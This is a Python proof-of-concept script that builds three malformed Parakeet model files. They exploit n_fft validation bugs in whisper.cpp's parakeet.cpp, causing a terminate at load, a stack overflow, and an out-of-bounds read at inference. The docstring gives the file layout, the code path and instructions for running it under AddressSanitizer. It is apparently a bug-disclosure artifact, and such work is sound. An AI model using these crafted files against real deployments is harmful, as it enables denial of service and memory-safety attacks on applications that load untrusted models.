"""
Generates three crafted Parakeet model files that trigger the three
n_fft validation bugs in ggml-org/whisper.cpp src/parakeet.cpp.

Run:  python3 make_poc_final.py
Test: g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
          -L<build>/bin -lwhisper -lggml -lggml-base -lggml-cpu \
          -Wl,-rpath,<build>/bin -Iinclude -Iggml/include
      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_neg1.bin   # Bug 1: terminate
      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_zero.bin   # Bug 2: ret valid ctx (crash at inference)
      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_46349.bin  # Bug 3: ret valid ctx (OOB at inference)

File format:
  GGML magic (4) | 15x hparams int32 | mel_filters (12) | window_n=0 (4) |
  tdt[0] (4) | vocab_n=2 (4) | tok"a" | tok"b" | <EOF>

n_loaded==0 triggers the "empty model for testing" warning path in
parakeet_model_load, which returns true, causing mel_cache.init(n_fft)
to be called outside the try/catch at parakeet.cpp:3114.
"""
import struct

MAGIC = 0x67676d6c  # GGML_FILE_MAGIC "ggml"

def i32(v): return struct.pack('<i', v)
def u32(v): return struct.pack('<I', v)
def f32(v): return struct.pack('<f', v)

def make_model(n_fft_value, filename):
    buf = bytearray()
    buf += u32(MAGIC)
    # 15 hparams in read order (parakeet.cpp:1006-1015):
    # n_vocab, n_audio_ctx, n_audio_state, n_audio_head, n_audio_layer,
    # n_mels, ftype, n_fft, subsampling_factor, n_subsampling_channels,
    # n_conv_kernel, n_pred_dim, n_pred_layers, n_tdt_durations, n_max_tokens
    for v in [2, 0, 1, 1, 0, 1, 0, n_fft_value, 1, 1, 1, 1, 1, 1, 1]:
        buf += i32(v)
    # mel filters (parakeet.cpp:1059-1068): n_mel=1, n_fb=1, 1 float
    buf += i32(1); buf += i32(1); buf += f32(0.0)
    # window function (parakeet.cpp:1070-1080): n_window=0 -> no data
    buf += i32(0)
    # tdt_durations (parakeet.cpp:1083-1092): 1 entry
    buf += u32(1)
    # vocab (parakeet.cpp:1094-1130): 2 tokens
    buf += i32(2)
    for tok in [b"a", b"b"]:
        buf += u32(len(tok))
        buf += tok
    # No tensor data -> n_loaded stays 0 -> "empty model" warning path
    # -> parakeet_model_load returns true -> mel_cache.init(n_fft) fires
    with open(filename, 'wb') as f:
        f.write(buf)
    print(f"[+] wrote {filename} ({len(buf)} bytes)  n_fft={n_fft_value}")

make_model(-1,    "poc_nfft_neg1.bin")   # Bug 1: std::terminate at model load
make_model(0,     "poc_nfft_zero.bin")   # Bug 2: valid ctx, stack-overflow at inference
make_model(46349, "poc_nfft_46349.bin")  # Bug 3: valid ctx, OOB read at inference
